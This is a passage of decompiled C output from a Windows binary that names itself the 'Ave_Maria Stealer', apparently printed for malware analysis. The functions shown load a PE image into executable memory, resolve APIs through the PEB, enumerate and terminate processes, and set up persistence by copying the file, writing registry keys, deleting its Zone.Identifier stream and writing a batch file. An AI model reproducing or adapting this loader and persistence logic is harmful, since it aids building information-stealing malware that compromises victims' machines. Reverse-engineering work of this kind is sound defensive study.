            return *(char *)v3 != 0;
        }
        v4 = *(char *)v3;
        result = 1;
    }
    // 0x414523
    return result;
}

// Address range: 0x41452d - 0x4145a1
int32_t function_41452d(int32_t a1, int32_t a2) {
    int32_t v1 = 0; // bp-8, 0x41453b
    int32_t v2 = function_414498(); // 0x41453e
    if (v2 == 0) {
        // 0x41459a
        return 0;
    }
    int32_t v3 = function_414422(5, &v1); // 0x414550
    if (v3 != 0) {
        // 0x41455c
        if (v1 != 0) {
            // 0x414566
            int32_t v4; // bp-28, 0x41452d
            int32_t v5 = &v4; // 0x41453a
            int32_t v6 = v1; // 0x414569
            v6 -= *(int32_t *)(v3 + 4);
            *(int32_t *)(v5 - 4) = a2;
            *(int32_t *)(v5 - 8) = a1;
            *(int32_t *)(v5 - 12) = v3 + 8;
            int32_t v7 = function_414278((int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x41457e
            while (v6 != 0 == (v7 != 0)) {
                // 0x414566
                v6 -= *(int32_t *)(v7 + 4);
                *(int32_t *)(v5 - 4) = a2;
                *(int32_t *)(v5 - 8) = a1;
                *(int32_t *)(v5 - 12) = v7 + 8;
                v7 = function_414278((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
            }
            // 0x41459a
            return v7 & -256 | 1;
        }
    }
    // 0x41459a
    return v3 & -256 | (int32_t)(*(char *)(v2 + 22) % 2 ^ 1);
}

// Address range: 0x4145a1 - 0x4146d3
int32_t function_4145a1(void) {
    // 0x4145a1
    function_4143f4();
    function_41473a();
    function_4143f4();
    function_41473a();
    function_4143f4();
    function_41473a();
    function_4143f4();
    function_41473a();
    int32_t v1 = function_414422(1, NULL); // 0x414608
    if (v1 == 0) {
        // 0x41461c
        return v1 & -256 | 1;
    }
    int32_t v2 = *(int32_t *)(v1 + 12); // 0x4146bd
    if (v2 == 0) {
        // 0x41461c
        return v1 & -256 | 1;
    }
    // 0x414621
    int32_t v3; // bp-40, 0x4145a1
    int32_t v4 = &v3;
    int32_t v5; // bp-8, 0x4145a1
    int32_t v6 = &v5; // 0x414635
    char v7; // bp-16, 0x4145a1
    int32_t v8 = &v7;
    int32_t v9; // bp-48, 0x4145a1
    int32_t v10 = &v9;
    int32_t v11; // bp-60, 0x4145a1
    int32_t v12 = &v11; // 0x4145a1
    int32_t v13 = v1;
    v5 = 0;
    int32_t v14; // 0x4145a1
    *(int32_t *)(v12 - 4) = v2 + v14;
    *(int32_t *)(v12 - 8) = v4;
    *(int32_t *)(v12 - 12) = v6;
    *(int32_t *)(v12 - 16) = v4;
    *(int32_t *)(v12 - 20) = 0;
    int32_t v15 = v12 - 24; // 0x41463c
    *(int32_t *)v15 = 0;
    int32_t v16 = v4; // 0x414642
    while (&v3 >= NULL) {
        int32_t v17 = v5; // 0x414648
        v16 = v4;
        if (v17 == 0) {
            // break -> 0x4146cc
            break;
        }
        int32_t v18 = *(int32_t *)v13; // 0x41464f
        int32_t v19 = v18; // 0x414653
        if (v18 == 0) {
            // 0x414655
            v19 = *(int32_t *)(v13 + 16);
        }
        int32_t v20 = v19 + v14; // 0x41465d
        int32_t v21 = *(int32_t *)v20; // 0x41465f
        v12 = v15;
        if (v21 != 0) {
            int32_t v22 = v17; // 0x4145a1
            int32_t v23 = v20; // 0x4146a1
            int32_t v24 = *(int32_t *)(v13 + 16) + v14;
            int32_t v25 = v15;
            int32_t v26 = v21;
            int32_t v27; // 0x4145a1
            int32_t v28; // 0x414690
            int32_t v29; // 0x414673
            if (v26 >= 0) {
                // 0x414693
                *(int32_t *)(v25 - 4) = v14 + 2 + v26;
                *(int32_t *)(v25 - 8) = v10;
                *(int32_t *)(v25 - 12) = v8;
                *(int32_t *)(v25 - 16) = 0;
                *(int32_t *)(v25 - 20) = v10;
                v28 = v25 - 24;
                *(int32_t *)v28 = v5;
                v27 = v28;
                v16 = v10;
                if (&v9 < NULL) {
                    return v16 & -256;
                }
            } else {
                // 0x414693
                *(int32_t *)(v25 - 4) = v8;
                *(int32_t *)(v25 - 8) = v26 % 0x10000;
                *(int32_t *)(v25 - 12) = 0;
                v29 = v25 - 16;
                *(int32_t *)v29 = v22;
                v27 = v29;
            }
            // 0x41469a
            v16 = 0;
            char v30; // 0x4145a1
            if (v30 == 0) {
                return v16 & -256;
            }
            int32_t v31 = v27;
            v23 += 4;
            *(int32_t *)v24 = (int32_t)v30;
            int32_t v32 = *(int32_t *)v23; // 0x4146a9
            v12 = v31;
            while (v32 != 0) {
                // 0x4146af
                v22 = v5;
                v24 += 4;
                v25 = v31;
                v26 = v32;
                if (v26 >= 0) {
                    // 0x414693
                    *(int32_t *)(v25 - 4) = v14 + 2 + v26;
                    *(int32_t *)(v25 - 8) = v10;
                    *(int32_t *)(v25 - 12) = v8;
                    *(int32_t *)(v25 - 16) = 0;
                    *(int32_t *)(v25 - 20) = v10;
                    v28 = v25 - 24;
                    *(int32_t *)v28 = v5;
                    v27 = v28;
                    v16 = v10;
                    if (&v9 < NULL) {
                        return v16 & -256;
                    }
                } else {
                    // 0x414693
                    *(int32_t *)(v25 - 4) = v8;
                    *(int32_t *)(v25 - 8) = v26 % 0x10000;
                    *(int32_t *)(v25 - 12) = 0;
                    v29 = v25 - 16;
                    *(int32_t *)v29 = v22;
                    v27 = v29;
                }
                // 0x41469a
                v16 = 0;
                if (v30 == 0) {
                    return v16 & -256;
                }
                // 0x4146a1
                v31 = v27;
                v23 += 4;
                *(int32_t *)v24 = (int32_t)v30;
                v32 = *(int32_t *)v23;
                v12 = v31;
            }
        }
        int32_t v33 = *(int32_t *)(v13 + 32); // 0x4146bd
        if (v33 == 0) {
            // 0x41461c
            return 1;
        }
        v13 += 20;
        v5 = 0;
        *(int32_t *)(v12 - 4) = v33 + v14;
        *(int32_t *)(v12 - 8) = v4;
        *(int32_t *)(v12 - 12) = v6;
        *(int32_t *)(v12 - 16) = v4;
        *(int32_t *)(v12 - 20) = 0;
        v15 = v12 - 24;
        *(int32_t *)v15 = 0;
        v16 = v4;
    }
  lab_0x4146cc_2:
    // 0x41461c
    return v16 & -256;
}

// Address range: 0x4146d3 - 0x41471f
int32_t function_4146d3(void) {
    // 0x4146d3
    int128_t v1; // 0x4146d3
    int128_t v2 = v1;
    int32_t v3; // 0x4146d3
    int64_t v4 = v3; // 0x4146d7
    int128_t v5 = __asm_xorps(v2, v2); // 0x4146d8
    __asm_movlpd(v4, v5);
    int32_t v6 = function_414498(); // 0x4146e0
    int32_t result; // 0x4146d3
    if (v6 == 0) {
        // 0x41471b
        return result;
    }
    int16_t v7 = *(int16_t *)(v6 + 4); // 0x4146e9
    if (v7 == -0x799c) {
        // 0x41471b
        return *(int32_t *)(v6 + 48);
    }
    // 0x4146ff
    __asm_movlpd(v4, v5);
    if (v7 == 332) {
        // 0x41470e
        result = *(int32_t *)(v6 + 52);
    }
    // 0x41471b
    return result;
}

// Address range: 0x41471f - 0x41473a
int32_t function_41471f(void) {
    int32_t v1 = __readfsdword(48); // 0x41471f
    if (v1 == 0) {
        // 0x414737
        return 0;
    }
    int32_t v2 = *(int32_t *)(*(int32_t *)(v1 + 12) + 12); // 0x41472c
    return *(int32_t *)(*(int32_t *)*(int32_t *)v2 + 24);
}

// Address range: 0x41473a - 0x4147a3
int32_t function_41473a(void) {
    // 0x41473a
    int32_t v1; // bp-12, 0x41473a
    int32_t v2 = function_414422(0, &v1); // 0x41474f
    if (v2 == 0) {
        // 0x414788
        return 0;
    }
    // 0x41475d
    int32_t v3; // 0x41473a
    int32_t v4 = *(int32_t *)(v2 + 32) + v3; // 0x414760
    v1 = v4;
    int32_t * v5 = (int32_t *)(v2 + 24); // 0x414765
    if (*v5 == 0) {
        // 0x414788
        return 0;
    }
    // 0x41476a
    v1 = v4;
    int32_t v6; // bp-24, 0x41473a
    int32_t v7 = &v6; // 0x414772
    int32_t v8 = 0;
    v7 -= 8;
    *(int32_t *)v7 = *(int32_t *)(4 * v8 + v1) + v3;
    while (lstrcmpA((char *)&g322, (char *)&g322) != 0) {
        int32_t v9 = v8 + 1; // 0x414780
        if (v9 >= *v5) {
            // 0x414788
            return 0;
        }
        v8 = v9;
        v7 -= 8;
        *(int32_t *)v7 = *(int32_t *)(4 * v8 + v1) + v3;
    }
    uint16_t v10 = *(int16_t *)(2 * v8 + v3 + *(int32_t *)(v2 + 36)); // 0x414798
    int32_t v11 = *(int32_t *)(*(int32_t *)(v2 + 28) + v3 + 4 * (int32_t)v10); // 0x41479c
    // 0x414788
    return v11 + v3;
}

// Address range: 0x4147a3 - 0x414894
int32_t function_4147a3(void) {
    int32_t v1 = function_414498(); // 0x4147b4
    if (v1 == 0) {
        // 0x41488f
        return 0;
    }
    int32_t v2 = 0; // bp-52, 0x4147cd
    int32_t * memory = VirtualAlloc(NULL, *(int32_t *)(v1 + 80), 0x3000, 64); // 0x4147cf
    if (memory == NULL) {
        // 0x41488f
        return 0;
    }
    int32_t v3 = &v2; // 0x4147cd
    int32_t result = (int32_t)memory; // 0x4147cf
    int32_t v4 = v1 + 24 + (int32_t)*(int16_t *)(v1 + 20); // 0x4147e6
    int32_t v5; // 0x4147a3
    function_40126d(memory, (int32_t *)v5, *(int32_t *)(v4 + 20));
    int16_t * v6 = (int16_t *)(v1 + 6); // 0x4147fc
    int32_t * v7 = (int32_t *)(v3 - 4);
    int32_t * v8 = (int32_t *)(v3 - 8);
    if (*v6 != 0) {
        int32_t * v9 = (int32_t *)(v3 - 12); // 0x414817
        int32_t v10 = 0; // 0x414841
        int32_t v11 = 40 * (v10 % 0x10000) + v4;
        *v7 = *(int32_t *)(v11 + 8);
        int32_t * v12 = (int32_t *)(v11 + 12); // 0x41480f
        *v8 = 0;
        *v9 = *v12 + result;
        function_401293((int32_t *)v10, (int32_t)&g322, (int32_t)&g322);
        *v7 = *(int32_t *)(v11 + 16);
        *v8 = *(int32_t *)(v11 + 20) + v5;
        *v9 = *v12 + result;
        function_40126d(&g322, &g322, (int32_t)&g322);
        v10++;
        while (*v6 > (int16_t)v10) {
            // 0x414802
            v11 = 40 * (v10 % 0x10000) + v4;
            *v7 = *(int32_t *)(v11 + 8);
            v12 = (int32_t *)(v11 + 12);
            *v8 = 0;
            *v9 = *v12 + result;
            function_401293((int32_t *)v10, (int32_t)&g322, (int32_t)&g322);
            *v7 = *(int32_t *)(v11 + 16);
            *v8 = *(int32_t *)(v11 + 20) + v5;
            *v9 = *v12 + result;
            function_40126d(&g322, &g322, (int32_t)&g322);
            v10++;
        }
    }
    uint32_t v13 = function_4146d3(); // 0x41484d
    *v7 = (result >> 31) - v5 + (int32_t)(v13 > result);
    *v8 = result - v13;
    if ((char)function_41452d((int32_t)&g322, (int32_t)&g322) == 0) {
        // 0x41488f
        return result;
    }
    // 0x41486c
    if (!((v5 == 0 | (char)function_4145a1() == 0))) {
        // 0x41487d
        *v7 = 0;
        *v8 = 1;
        *(int32_t *)(v3 - 12) = result;
    }
    // 0x41488f
    return result;
}

// Address range: 0x414894 - 0x4148d1
int32_t function_414894(int32_t a1, int32_t a2) {
    // 0x414894
    int32_t v1; // 0x414894
    int32_t result = v1;
    *(int32_t *)(result + 40) = 0;
    *(int32_t *)(result + 44) = 0;
    __asm_rep_movsd_memcpy((char *)result, (char *)a2, 10);
    function_403fc7(*(int32_t *)(result + 12) + a1, *(int32_t *)(result + 16));
    return result;
}

// Address range: 0x4148d1 - 0x414902
int32_t function_4148d1(int32_t a1) {
    // 0x4148d1
    int32_t result; // 0x4148d1
    *(int32_t *)(result + 40) = 0;
    *(int32_t *)(result + 44) = 0;
    __asm_rep_movsd_memcpy((char *)result, (char *)a1, 10);
    function_403eca(a1 + 40);
    return result;
}

// Address range: 0x414902 - 0x4149a8
int32_t function_414902(void) {
    // 0x414902
    function_41471f();
    int32_t v1 = function_41473a(); // 0x414916
    int32_t result = v1; // 0x41491e
    int32_t v2; // 0x414902
    if (v2 != 0 && v1 != 0) {
        // 0x414938
        function_4145a1();
        g166 = 0;
        int32_t v3 = 0; // bp-12, 0x41494d
        int32_t v4 = function_40460a(L"Ave_Maria Stealer OpenSource github Link: https://github.com/syohex/java-simple-mine-sweeper"); // 0x414950
        function_4149a8(v4, &v3);
        function_406f1d();
        function_406f1d();
        v3 = 0;
        int32_t v5 = function_40460a(L"C:\\Users\\Vitali Kremez\\Documents\\MidgetPorn\\workspace\\MsgBox.exe"); // 0x414980
        function_4149a8(v5, &v3);
        function_406f1d();
        result = function_406f1d();
    }
    // 0x4149a5
    return result;
}

// Address range: 0x4149a8 - 0x4149ff
int32_t function_4149a8(int32_t a1, int32_t * a2) {
    // 0x4149a8
    int32_t lpStartupInfo; // bp-88, 0x4149a8
    function_401293(&lpStartupInfo, 0, 68);
    lpStartupInfo = 68;
    int32_t lpCommandLine = *a2; // 0x4149d0
    int32_t lpApplicationName = *(int32_t *)a1; // 0x4149e1
    int32_t lpProcessInformation; // bp-20, 0x4149a8
    bool v1 = CreateProcessW((int16_t *)lpApplicationName, (int16_t *)lpCommandLine, NULL, NULL, false, 0, NULL, NULL, (struct _STARTUPINFOW *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation); // 0x4149e3
    int32_t result = 0; // 0x4149eb
    if (v1) {
        // 0x4149ed
        int32_t v2; // 0x4149a8
        *(int32_t *)v2 = lpProcessInformation;
        result = 1;
    }
    // 0x4149f9
    return result;
}

// Address range: 0x4149ff - 0x414a05
int32_t function_4149ff(void) {
    // 0x4149ff
    int32_t result; // 0x4149ff
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x414a05 - 0x414a39
int32_t function_414a05(int32_t a1) {
    // 0x414a05
    GetProcAddress(GetModuleHandleA("kernel32"), (char *)&g322);
    return 0;
}

// Address range: 0x414a39 - 0x414a3c
int32_t function_414a39(void) {
    // 0x414a39
    int32_t result; // 0x414a39
    return result;
}

// Address range: 0x414a3c - 0x414a4a
int32_t function_414a3c(int32_t a1) {
    // 0x414a3c
    int32_t result; // 0x414a3c
    *(int32_t *)result = a1;
    return result;
}

// Address range: 0x414a4a - 0x414ac7
int32_t function_414a4a(int32_t a1) {
    int32_t v1 = 556; // bp-560, 0x414a5c
    int32_t * v2 = CreateToolhelp32Snapshot(2, 0); // 0x414a68
    int32_t result; // 0x414a4a
    if (v2 == (int32_t *)-1) {
        // 0x414aa6
        *(int32_t *)result = 0;
        // 0x414aa9
        return result;
    }
    int32_t v3 = (int32_t)v2; // 0x414a68
    int32_t v4 = v3; // bp-588, 0x414a7c
    int32_t v5 = &v4; // 0x414a7c
    if (!Process32FirstW(v2, (struct tagPROCESSENTRY32W *)&v1)) {
        // 0x414a9f
        *(int32_t *)(v5 - 4) = v3;
        CloseHandle(&g322);
        // 0x414aa6
        *(int32_t *)result = 0;
        // 0x414aa9
        return result;
    }
    int32_t v6 = v5; // 0x414a94
    int32_t * v7 = (int32_t *)(v6 - 4);
    // 0x414ab0
    *v7 = v3;
    CloseHandle(&g322);
    int32_t v8; // bp-524, 0x414a4a
    *(int32_t *)(v5 - 8) = (int32_t)&v8;
    function_40460a((int16_t *)&g322);
    // 0x414aa9
    return result;
}

// Address range: 0x414ac7 - 0x414af5
int32_t function_414ac7(void) {
    // 0x414ac7
    int32_t dwProcessId; // 0x414ac7
    int32_t * hProcess = OpenProcess(1, false, dwProcessId); // 0x414acd
    if (hProcess == NULL) {
        // 0x414af1
        return 0;
    }
    bool result = TerminateProcess(hProcess, 0); // 0x414add
    CloseHandle(hProcess);
    return result;
}

// Address range: 0x414af5 - 0x414ce8
int32_t function_414af5(int32_t a1) {
    // 0x414af5
    int32_t v1; // bp-600, 0x414af5
    function_401293(&v1, 0, 552);
    int32_t v2 = 556; // bp-604, 0x414b1a
    function_4018ac();
    int32_t v3 = 2; // bp-1668, 0x414b39
    int32_t * v4 = CreateToolhelp32Snapshot(2, 0); // 0x414b3b
    int32_t v5; // bp-44, 0x414af5
    int32_t result; // 0x414af5
    if (v4 == (int32_t *)-1) {
        int32_t v6 = &v3;
        *(int32_t *)(v6 - 4) = (int32_t)&v5;
        function_40147b(&g322);
        function_4014c2();
        return result;
    }
    int32_t v7 = (int32_t)v4; // 0x414b3b
    int32_t v8 = v7; // bp-1676, 0x414b53
    int32_t v9 = &v8; // 0x414b53
    bool v10 = Process32FirstW(v4, (struct tagPROCESSENTRY32W *)&v2); // 0x414b54
    int32_t v11 = v9 - 4;
    int32_t * v12 = (int32_t *)v11;
    int32_t v13 = v11; // 0x414cc1
    int32_t * v14 = v12; // 0x414cc1
    if (v10) {
        // 0x414b5f
        int32_t v15; // bp-1644, 0x414af5
        int32_t v16 = &v15;
        int32_t v17; // bp-568, 0x414af5
        *v12 = (int32_t)&v17;
        function_40428f(result);
        *(int32_t *)(v9 - 12) = 0;
        *(int32_t *)(v9 - 16) = 0x1410;
        int32_t * v18 = OpenProcess((int32_t)&g322, (bool)&g322, (int32_t)&g322); // 0x414b89
        int32_t * v19 = (int32_t *)(v9 - 20);
        int32_t v20; // 0x414af5
        int32_t v21; // 0x414af5
        int32_t v22; // 0x414c22
        int32_t v23; // 0x414c27
        int32_t v24; // 0x414b89
        int32_t * v25; // 0x414ba5
        int32_t * v26; // 0x414ba7
        int32_t * v27; // 0x414af5
        int32_t v28; // 0x414bf7
        int32_t v29; // 0x414bfc
        int32_t v30; // 0x414bd3
        int32_t v31; // 0x414bd8
        int32_t v32; // 0x414c11
        if (v18 == (int32_t *)-1) {
            // 0x414c1a
            *v19 = (int32_t)&g76;
            v22 = function_40460a((int16_t *)&g322);
            v23 = v9 - 24;
            *(int32_t *)v23 = v22;
            function_4043c7((int32_t)&g322);
            function_406f1d();
            v21 = v23;
        } else {
            // 0x414b9a
            v24 = (int32_t)v18;
            *v19 = 1040;
            v25 = (int32_t *)(v9 - 24);
            *v25 = 0;
            v26 = (int32_t *)(v9 - 28);
            *v26 = v16;
            function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
            *v19 = 520;
            *v25 = v16;
            *v26 = 0;
            *(int32_t *)(v9 - 32) = v24;
            v27 = (int32_t *)(v9 - 36);
            if (K32GetModuleFileNameExW() == 0) {
                // 0x414bef
                *v27 = (int32_t)&g76;
                v28 = function_40460a((int16_t *)&g322);
                v29 = v9 - 40;
                *(int32_t *)v29 = v28;
                function_4043c7((int32_t)&g322);
                function_406f1d();
                v20 = v29;
            } else {
                // 0x414bc9
                *v27 = v16;
                v30 = function_40460a((int16_t *)&g322);
                v31 = v9 - 40;
                *(int32_t *)v31 = v30;
                function_4043c7((int32_t)&g322);
                function_406f1d();
                v20 = v31;
            }
            // 0x414c11
            v32 = v20 - 4;
            *(int32_t *)v32 = v24;
            CloseHandle(&g322);
            v21 = v32;
        }
        // 0x414c3c
        *(int32_t *)(v21 - 8) = 0;
        *(int32_t *)(v21 - 4) = 0;
        function_4017a5((int32_t)&g322);
        function_4015fb();
        *(int32_t *)(v21 - 16) = (int32_t)&v2;
        int32_t v33 = v21 - 20; // 0x414cb5
        *(int32_t *)v33 = v7;
        bool v34 = Process32NextW(&g322, (struct tagPROCESSENTRY32W *)&g322); // 0x414cb6
        int32_t v35 = v21 - 24;
        int32_t * v36 = (int32_t *)v35;
        *v36 = 0;
        v13 = v35;
        v14 = v36;
        while (v34) {
            int32_t v37 = v33;
            *v36 = (int32_t)&v17;
            function_40428f(result);
            *(int32_t *)(v37 - 12) = 0;
            *(int32_t *)(v37 - 16) = 0x1410;
            v18 = OpenProcess((int32_t)&g322, (bool)&g322, (int32_t)&g322);
            v19 = (int32_t *)(v37 - 20);
            if (v18 == (int32_t *)-1) {
                // 0x414c1a
                *v19 = (int32_t)&g76;
                v22 = function_40460a((int16_t *)&g322);
                v23 = v37 - 24;
                *(int32_t *)v23 = v22;
                function_4043c7((int32_t)&g322);
                function_406f1d();
                v21 = v23;
            } else {
                // 0x414b9a
                v24 = (int32_t)v18;
                *v19 = 1040;
                v25 = (int32_t *)(v37 - 24);
                *v25 = 0;
                v26 = (int32_t *)(v37 - 28);
                *v26 = v16;
                function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
                *v19 = 520;
                *v25 = v16;
                *v26 = 0;
                *(int32_t *)(v37 - 32) = v24;
                v27 = (int32_t *)(v37 - 36);
                if (K32GetModuleFileNameExW() == 0) {
                    // 0x414bef
                    *v27 = (int32_t)&g76;
                    v28 = function_40460a((int16_t *)&g322);
                    v29 = v37 - 40;
                    *(int32_t *)v29 = v28;
                    function_4043c7((int32_t)&g322);
                    function_406f1d();
                    v20 = v29;
                } else {
                    // 0x414bc9
                    *v27 = v16;
                    v30 = function_40460a((int16_t *)&g322);
                    v31 = v37 - 40;
                    *(int32_t *)v31 = v30;
                    function_4043c7((int32_t)&g322);
                    function_406f1d();
                    v20 = v31;
                }
                // 0x414c11
                v32 = v20 - 4;
                *(int32_t *)v32 = v24;
                CloseHandle(&g322);
                v21 = v32;
            }
            // 0x414c3c
            *(int32_t *)(v21 - 8) = 0;
            *(int32_t *)(v21 - 4) = 0;
            function_4017a5((int32_t)&g322);
            function_4015fb();
            *(int32_t *)(v21 - 16) = (int32_t)&v2;
            v33 = v21 - 20;
            *(int32_t *)v33 = v7;
            v34 = Process32NextW(&g322, (struct tagPROCESSENTRY32W *)&g322);
            v35 = v21 - 24;
            v36 = (int32_t *)v35;
            *v36 = 0;
            v13 = v35;
            v14 = v36;
        }
    }
    // 0x414cc7
    *v14 = v7;
    CloseHandle(&g322);
    // 0x414cce
    *(int32_t *)(v13 - 4) = (int32_t)&v5;
    function_40147b(&g322);
    function_4014c2();
    return result;
}

// Address range: 0x414ce8 - 0x414cfb
int32_t function_414ce8(int32_t a1, int32_t a2, int32_t a3) {
    // 0x414ce8
    int32_t lpSubKey; // 0x414ce8
    return RegDeleteKeyW((int32_t *)-0x7fffffff, (int16_t *)lpSubKey) == 0;
}

// Address range: 0x414cfb - 0x414d03
int32_t function_414cfb(void) {
    // 0x414cfb
    int32_t v1; // 0x414cfb
    return v1 != 0;
}

// Address range: 0x414d03 - 0x414d25
int32_t function_414d03(int32_t a1) {
    int32_t result = 0; // 0x414d09
    int32_t hKey; // 0x414d03
    if (hKey != 0) {
        int32_t lpValueName = *(int32_t *)a1; // 0x414d0e
        result = RegDeleteValueW((int32_t *)hKey, (int16_t *)lpValueName) == 0;
    }
    // 0x414d21
    return result;
}

// Address range: 0x414d25 - 0x414d5e
int32_t function_414d25(int32_t * a1) {
    int32_t lpSubKey = *a1; // 0x414d3a
    int32_t lpdwDisposition = 0; // bp-8, 0x414d3c
    int32_t phkResult; // 0x414d25
    int32_t v1 = RegCreateKeyExW(HKEY_CURRENT_USER, (int16_t *)lpSubKey, 0, NULL, 1, 1, NULL, (int32_t **)phkResult, &lpdwDisposition); // 0x414d44
    int32_t result = 0; // 0x414d4c
    if (v1 == 0) {
        // 0x414d4e
        result = (v1 & -256 | (int32_t)(lpdwDisposition == 1)) + 1;
    }
    // 0x414d5a
    return result;
}

// Address range: 0x414d5e - 0x414d63
int32_t function_414d5e(void) {
    // 0x414d5e
    return function_414d63();
}

// Address range: 0x414d63 - 0x414d78
int32_t function_414d63(void) {
    // 0x414d63
    int32_t v1; // 0x414d63
    int32_t * hKey = (int32_t *)v1;
    int32_t result; // 0x414d63
    if (v1 != 0) {
        // 0x414d6b
        result = RegCloseKey(hKey);
    }
    // 0x414d73
    *hKey = 0;
    return result;
}

// Address range: 0x414d78 - 0x414dee
int32_t function_414d78(int32_t a1, int32_t a2) {
    int32_t * lpValueName = (int32_t *)a1; // 0x414d91
    int32_t lpcbData = 0; // bp-8, 0x414d93
    int32_t lpType = 0; // bp-12, 0x414d98
    if (RegQueryValueExW(NULL, (int16_t *)*lpValueName, NULL, &lpType, NULL, &lpcbData) != 0) {
        // 0x414de7
        return 0;
    }
    int32_t lpData = function_401000(lpcbData); // 0x414da8
    int32_t lpValueName2 = *lpValueName; // 0x414dbb
    int32_t v1 = RegQueryValueExW((int32_t *)lpcbData, (int16_t *)lpValueName2, NULL, &lpType, (char *)lpData, &lpcbData); // 0x414dbf
    if (v1 != 0) {
        // 0x414de7
        return 0;
    }
    // 0x414dc9
    function_403fc7(lpData, lpcbData);
    if (lpData != 0) {
        // 0x414dd9
        function_401014(lpData);
    }
    // 0x414de7
    return 1;
}

// Address range: 0x414dee - 0x414e25
int32_t function_414dee(int32_t a1, int32_t * a2, int32_t dwType) {
    int32_t result = 0; // 0x414df6
    int32_t hKey; // 0x414dee
    if (hKey != 0) {
        int32_t cbData = *(int32_t *)((int32_t)a2 + 4); // 0x414dfb
        int32_t lpData = *a2; // 0x414dfe
        int32_t lpValueName = *(int32_t *)a1; // 0x414e0a
        result = RegSetValueExW((int32_t *)hKey, (int16_t *)lpValueName, 0, dwType, (char *)lpData, cbData) == 0;
    }
    // 0x414e20
    return result;
}

// Address range: 0x414e25 - 0x414e8a
int32_t function_414e25(int32_t hKey, int32_t * a2, int32_t samDesired, int32_t a4) {
    int32_t lpdwDisposition = a4;
    int32_t v1; // bp-16, 0x414e25
    int32_t v2 = &v1; // 0x414e2e
    int32_t v3 = v2; // 0x414e35
    if (a4 != 0) {
        // 0x414e37
        v3 = v2;
        if (function_41340d() == 0) {
            // 0x414e45
            lpdwDisposition = 0;
            int32_t lpSubKey = *a2; // 0x414e54
            int32_t v4 = hKey; // bp-52, 0x414e56
            int32_t phkResult; // 0x414e25
            int32_t v5 = RegCreateKeyExW((int32_t *)hKey, (int16_t *)lpSubKey, 0, NULL, 0, samDesired, NULL, (int32_t **)phkResult, &lpdwDisposition); // 0x414e59
            if (v5 != 0) {
                // 0x414e7f
                return 0;
            }
            // 0x414e63
            function_414d63();
            v3 = &v4;
        }
    }
    // 0x414e6a
    *(int32_t *)(v3 - 8) = samDesired;
    *(int32_t *)(v3 - 12) = 0;
    *(int32_t *)(v3 - 16) = *a2;
    *(int32_t *)(v3 - 20) = hKey;
    int32_t v6 = RegOpenKeyExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t **)&g322); // 0x414e74
    // 0x414e7f
    return v6 == 0;
}

// Address range: 0x414e8a - 0x414e90
int32_t function_414e8a(void) {
    // 0x414e8a
    int32_t result; // 0x414e8a
    *(int32_t *)result = 0;
    return result;
}

// Address range: 0x414e90 - 0x414eef
int32_t function_414e90(void) {
    // 0x414e90
    int32_t v1; // 0x414e90
    if (v1 != 0) {
        // 0x414e9a
        function_414d63();
    }
    // 0x414e9f
    function_406ccd();
    function_406f1d();
    *(int32_t *)(v1 + 32) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 28) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 24) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 20) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 16) = 0;
    function_414d63();
    return function_414d63();
}

// Address range: 0x414eef - 0x41529e
int32_t function_414eef(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a1;
    function_413960();
    function_4044c4();
    int32_t v2; // bp-44, 0x414eef
    int32_t v3 = &v2; // bp-72, 0x414f16
    int32_t v4 = function_414d25(&v2); // 0x414f19
    function_414d63();
    int32_t v5; // 0x414eef
    int32_t v6; // bp-20, 0x414eef
    int32_t lpExistingFileName; // 0x414eef
    if (a1 == 0 || v4 == 0) {
        int32_t v7 = &v3; // 0x414f16
        v5 = v7;
        if (lpExistingFileName == 0) {
            // 0x415031
            *(int32_t *)(v7 - 8) = 0xf003f;
            *(int32_t *)(v7 - 12) = 0;
            *(int32_t *)(v7 - 16) = *(int32_t *)(lpExistingFileName + 16);
            int32_t v8 = v7 - 20; // 0x41503b
            *(int32_t *)v8 = -0x7fffffff;
            RegOpenKeyExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t **)&g322);
            v5 = v8;
        }
    } else {
        // 0x414f3d
        function_4043c7(function_413915());
        function_406f1d();
        function_4133fb();
        function_4043fa((int16_t *)&g17);
        function_404656(lpExistingFileName + 84);
        function_4042c5((int32_t)&v6);
        function_406f1d();
        int32_t v9 = lpExistingFileName + 32; // 0x414f92
        int32_t * lpNewFileName = (int32_t *)v9; // 0x414f92
        if (!CopyFileW((int16_t *)lpExistingFileName, (int16_t *)*lpNewFileName, false)) {
            // 0x415282
            function_406f1d();
            function_406f1d();
            return 0;
        }
        int32_t v10 = v6; // bp-108, 0x414fa5
        function_40424e((int32_t)&v10);
        int32_t v11 = v9; // bp-120, 0x414fb0
        function_4069a9(&v11);
        function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        v11 = 0;
        int32_t lpSubKey = *(int32_t *)(lpExistingFileName + 16); // 0x414fcc
        RegOpenKeyExW(HKEY_CURRENT_USER, (int16_t *)lpSubKey, 0, 0xf003f, (int32_t **)lpExistingFileName);
        int32_t v12; // bp-40, 0x414eef
        function_414dee(lpExistingFileName + 24, &v12, 3);
        function_40460a((int16_t *)*lpNewFileName);
        function_4042c5(function_40460a(L":Zone.Identifier"));
        function_406f1d();
        int16_t * lpFileName = (int16_t *)v6; // 0x415014
        int16_t * v13 = lpFileName; // bp-156, 0x415014
        DeleteFileW(lpFileName);
        function_406f1d();
        function_404081();
        v5 = (int32_t)&v13;
    }
    int32_t v14 = v5; // 0x41504a
    if (a3 != 0) {
        // 0x415050
        int32_t v15; // bp-28, 0x414eef
        *(int32_t *)(v5 - 4) = (int32_t)&v15;
        *(int32_t *)(v5 - 8) = 0;
        *(int32_t *)(v5 - 12) = 0;
        *(int32_t *)(v5 - 16) = (int32_t)&g2;
        SHGetKnownFolderPath((int32_t)&g322, (int32_t)&g322, &g322, (int16_t **)&g322);
        *(int32_t *)(v5 - 20) = v15;
        function_40460a((int16_t *)&g322);
        *(int32_t *)(v5 - 24) = (int32_t)L"\\programs.bat";
